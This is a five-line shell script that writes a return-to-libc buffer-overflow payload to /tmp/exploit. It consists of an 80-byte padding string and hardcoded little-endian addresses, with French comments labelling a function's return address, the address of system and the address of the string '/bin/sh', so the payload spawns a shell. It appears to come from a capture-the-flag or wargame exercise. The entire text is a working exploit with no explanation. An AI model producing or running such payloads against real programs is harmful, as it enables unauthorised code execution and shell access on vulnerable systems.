echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" > /tmp/exploit
echo -en "\x3e\x85\x04\x08" >> /tmp/exploit #adresse de ret de p
echo -en "\x60\xb0\xe6\xb7" >> /tmp/exploit #adresse de system
echo -n " SUS" >> /tmp/exploit
echo -en "\x58\xcc\xf8\xb7" >> /tmp/exploit #adresse de "/bin/sh"